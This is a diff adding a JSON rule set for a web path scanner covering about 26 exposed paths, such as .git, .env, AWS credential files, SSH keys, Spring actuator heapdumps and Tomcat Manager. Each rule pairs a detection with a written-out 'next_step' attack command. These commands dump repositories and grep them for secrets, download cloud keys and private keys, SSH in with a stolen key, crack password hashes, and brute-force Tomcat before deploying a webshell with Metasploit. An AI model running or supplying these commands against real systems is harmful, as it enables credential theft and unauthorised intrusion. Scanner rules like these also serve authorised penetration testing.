@@ -1,0 +1,210 @@
+[
+  {
+    "path": "/.git/HEAD",
+    "title": "Exposed .git repository",
+    "severity": "high", "category": "exposure", "tags": ["source-leak"],
+    "match": {"status": [200], "body_contains": ["ref:"]},
+    "why": "The .git directory is web-reachable — dump it to recover full source code, secrets and history.",
+    "next_step": "git-dumper {base}/.git/ loot_git && cd loot_git && git log -p | grep -iE 'pass|secret|key|token'"
+  },
+  {
+    "path": "/.git/config",
+    "title": "Exposed .git/config",
+    "severity": "high", "category": "exposure", "tags": ["source-leak"],
+    "match": {"status": [200], "body_contains": ["[core]", "repositoryformatversion"]},
+    "why": "Confirms a downloadable git repo and often leaks the remote origin URL (with embedded creds).",
+    "next_step": "git-dumper {base}/.git/ loot_git"
+  },
+  {
+    "path": "/.svn/entries",
+    "title": "Exposed .svn metadata",
+    "severity": "medium", "category": "exposure", "tags": ["source-leak"],
+    "match": {"status": [200]},
+    "why": "Subversion metadata is reachable — reconstruct source and find secrets.",
+    "next_step": "svn-extractor --url {base}/.svn/ || curl -s {base}/.svn/wc.db -o wc.db"
+  },
+  {
+    "path": "/.env",
+    "title": "Exposed .env file",
+    "severity": "critical", "category": "exposure", "tags": ["secrets"],
+    "match": {"status": [200], "body_regex": "(?m)^[A-Z0-9_]+="},
+    "why": "Framework .env files hold DB credentials, API keys and app secrets in cleartext — often instant lateral movement.",
+    "next_step": "curl -s {base}/.env"
+  },
+  {
+    "path": "/.aws/credentials",
+    "title": "Exposed AWS credentials file",
+    "severity": "critical", "category": "exposure", "tags": ["secrets", "cloud"],
+    "match": {"status": [200], "body_contains": ["aws_access_key_id", "[default]"]},
+    "why": "Cleartext AWS keys — pivot straight into the target's cloud account.",
+    "next_step": "curl -s {base}/.aws/credentials  # then: aws sts get-caller-identity"
+  },
+  {
+    "path": "/.ssh/id_rsa",
+    "title": "Exposed SSH private key",
+    "severity": "critical", "category": "exposure", "tags": ["secrets"],
+    "match": {"status": [200], "body_contains": ["PRIVATE KEY"]},
+    "why": "A downloadable private key is often reusable for SSH into this or a related host.",
+    "next_step": "curl -s {base}/.ssh/id_rsa -o id_rsa && chmod 600 id_rsa && ssh -i id_rsa user@{host}"
+  },
+  {
+    "path": "/.DS_Store",
+    "title": "Exposed .DS_Store (directory listing leak)",
+    "severity": "low", "category": "exposure", "tags": ["recon"],
+    "match": {"status": [200], "body_contains": ["Bud1"]},
+    "why": "macOS .DS_Store reveals hidden filenames in the directory to guide further discovery.",
+    "next_step": "python3 ds_store_exp.py {base}/.DS_Store"
+  },
+  {
+    "path": "/.htpasswd",
+    "title": "Exposed .htpasswd",
+    "severity": "high", "category": "exposure", "tags": ["secrets"],
+    "match": {"status": [200], "body_regex": ":\\$(apr1|1|2y|6)\\$"},
+    "why": "HTTP basic-auth password hashes — crack offline with john/hashcat.",
+    "next_step": "curl -s {base}/.htpasswd | tee htpasswd && john htpasswd"
+  },
+  {
+    "path": "/server-status",
+    "title": "Apache mod_status exposed",
+    "severity": "medium", "category": "misconfig", "tags": ["recon"],
+    "match": {"status": [200], "body_contains": ["Apache Server Status"]},
+    "why": "Live request table leaks internal URLs, client IPs, and session tokens in query strings.",
+    "next_step": "curl -s {base}/server-status | grep -Eo 'GET[^<]+'"
+  },
+  {
+    "path": "/phpinfo.php",
+    "title": "phpinfo() exposed",
+    "severity": "medium", "category": "exposure", "tags": ["recon"],
+    "match": {"status": [200], "body_contains": ["phpinfo()", "PHP Version"]},
+    "why": "Leaks full server config, paths, loaded modules and environment — great recon for chaining LFI/RCE.",
+    "next_step": "curl -s {base}/phpinfo.php | grep -iE 'DOCUMENT_ROOT|disable_functions|open_basedir'"
+  },
+  {
+    "path": "/info.php",
+    "title": "phpinfo() exposed (info.php)",
+    "severity": "medium", "category": "exposure", "tags": ["recon"],
+    "match": {"status": [200], "body_contains": ["phpinfo()", "PHP Version"]},
+    "why": "Same as phpinfo.php — full PHP/server configuration disclosure.",
+    "next_step": "curl -s {base}/info.php | grep -i disable_functions"
+  },
+  {
+    "path": "/actuator",
+    "title": "Spring Boot Actuator exposed",
+    "severity": "high", "category": "misconfig", "tags": ["recon", "spring"],
+    "match": {"status": [200], "body_contains": ["_links", "self"]},
+    "why": "Open actuator endpoints leak env vars, mappings and heap dumps; /env + /refresh or gateway routes can lead to RCE.",
+    "next_step": "curl -s {base}/actuator | jq . ; curl -s {base}/actuator/env ; curl -s {base}/actuator/heapdump -o heap.bin"
+  },
+  {
+    "path": "/actuator/env",
+    "title": "Spring Boot Actuator /env exposed",
+    "severity": "high", "category": "exposure", "tags": ["secrets", "spring"],
+    "match": {"status": [200], "body_contains": ["propertySources", "systemEnvironment"]},
+    "why": "Dumps environment including DB passwords and cloud credentials; also enables property-injection RCE chains.",
+    "next_step": "curl -s {base}/actuator/env | jq '.. | .value? // empty'"
+  },
+  {
+    "path": "/actuator/heapdump",
+    "title": "Spring Boot heapdump downloadable",
+    "severity": "critical", "category": "exposure", "tags": ["secrets", "spring"],
+    "match": {"status": [200], "content_type_contains": ["octet-stream"]},
+    "why": "A heap dump contains live secrets, session tokens and passwords — grep the binary for credentials.",
+    "next_step": "curl -s {base}/actuator/heapdump -o heap.bin && strings heap.bin | grep -iE 'password|secret|token'"
+  },
+  {
+    "path": "/manager/html",
+    "title": "Tomcat Manager reachable",
+    "severity": "high", "category": "default-creds", "tags": ["rce", "default-creds"],
+    "match": {"status": [200, 401, 403]},
+    "why": "Tomcat Manager with default creds (tomcat/tomcat, admin/admin) lets you deploy a WAR webshell = RCE.",
+    "next_step": "hydra -C tomcat-defaults.txt {host} http-get /manager/html ; msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload;set RHOSTS {host}'"
+  },
+  {
+    "path": "/swagger-ui.html",
+    "title": "Swagger UI exposed",
+    "severity": "low", "category": "recon", "tags": ["api"],
+    "match": {"status": [200], "body_contains": ["swagger", "Swagger UI"]},
+    "why": "Full API documentation — enumerate every endpoint and parameter to test for authz/IDOR/injection.",
+    "next_step": "curl -s {base}/v2/api-docs | jq '.paths | keys'"
+  },
+  {
+    "path": "/v2/api-docs",
+    "title": "OpenAPI/Swagger spec exposed",
+    "severity": "low", "category": "recon", "tags": ["api"],
+    "match": {"status": [200], "body_contains": ["swagger", "openapi", "\"paths\""]},
+    "why": "Machine-readable API map — feed it to your fuzzer/authz tests.",
+    "next_step": "curl -s {base}/v2/api-docs -o api.json"
+  },
+  {
+    "path": "/graphql",
+    "title": "GraphQL endpoint (test introspection)",
+    "severity": "low", "category": "recon", "tags": ["api"],
+    "match": {"status": [200, 400], "body_contains": ["__schema", "errors", "data"]},
+    "why": "If introspection is on you get the entire schema; also test batching/aliasing abuse and IDOR.",
+    "next_step": "curl -s {base}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'"
+  },
+  {
+    "path": "/_cat/indices",
+    "title": "Elasticsearch REST exposed",
+    "severity": "high", "category": "exposure", "tags": ["unauth", "data"],
+    "match": {"status": [200]},
+    "why": "Unauthenticated Elasticsearch — read/dump every index (often full application data).",
+    "next_step": "curl -s {base}/_cat/indices?v ; curl -s {base}/_all/_search?size=5"
+  },
+  {
+    "path": "/_all_dbs",
+    "title": "CouchDB REST exposed",
+    "severity": "high", "category": "exposure", "tags": ["unauth", "data"],
+    "match": {"status": [200], "body_contains": ["[", "_users"]},
+    "why": "Open CouchDB lists databases; older versions allow admin-party account creation -> RCE.",
+    "next_step": "curl -s {base}/_all_dbs ; curl -s {base}/_users/_all_docs"
+  },
+  {
+    "path": "/web.config",
+    "title": "web.config downloadable",
+    "severity": "high", "category": "exposure", "tags": ["secrets"],
+    "match": {"status": [200], "body_contains": ["<configuration", "connectionStrings"]},
+    "why": "IIS web.config leaks connection strings and machine keys (machineKey enables ViewState RCE).",
+    "next_step": "curl -s {base}/web.config"
+  },
+  {
+    "path": "/wp-login.php",
+    "title": "WordPress login found",
+    "severity": "low", "category": "recon", "tags": ["wordpress"],
+    "match": {"status": [200], "body_contains": ["wordpress", "wp-submit"]},
+    "why": "WordPress present — enumerate users/plugins and check for vulnerable plugin versions.",
+    "next_step": "wpscan --url {base} --enumerate u,vp,vt --plugins-detection aggressive"
+  },
+  {
+    "path": "/robots.txt",
+    "title": "robots.txt (path disclosure)",
+    "severity": "info", "category": "recon", "tags": ["recon"],
+    "match": {"status": [200], "body_contains": ["Disallow"]},
+    "why": "Disallowed paths often point straight at admin panels and sensitive directories.",
+    "next_step": "curl -s {base}/robots.txt"
+  },
+  {
+    "path": "/backup.zip",
+    "title": "Backup archive exposed",
+    "severity": "high", "category": "exposure", "tags": ["source-leak"],
+    "match": {"status": [200], "content_type_contains": ["zip", "octet-stream"]},
+    "why": "A downloadable backup usually contains full source and config with secrets.",
+    "next_step": "curl -s {base}/backup.zip -o backup.zip && unzip -l backup.zip"
+  },
+  {
+    "path": "/dump.sql",
+    "title": "SQL dump exposed",
+    "severity": "critical", "category": "exposure", "tags": ["data", "secrets"],
+    "match": {"status": [200], "body_contains": ["INSERT INTO", "CREATE TABLE"]},
+    "why": "A database dump on the webroot leaks users and password hashes directly.",
+    "next_step": "curl -s {base}/dump.sql | grep -iE 'INSERT INTO .*(user|admin|password)'"
+  },
+  {
+    "path": "/.well-known/security.txt",
+    "title": "security.txt present",
+    "severity": "info", "category": "recon", "tags": ["recon"],
+    "match": {"status": [200], "body_contains": ["Contact"]},
+    "why": "Not a vuln — notes the security contact and disclosure policy for responsible reporting.",
+    "next_step": "curl -s {base}/.well-known/security.txt"
+  }
+]
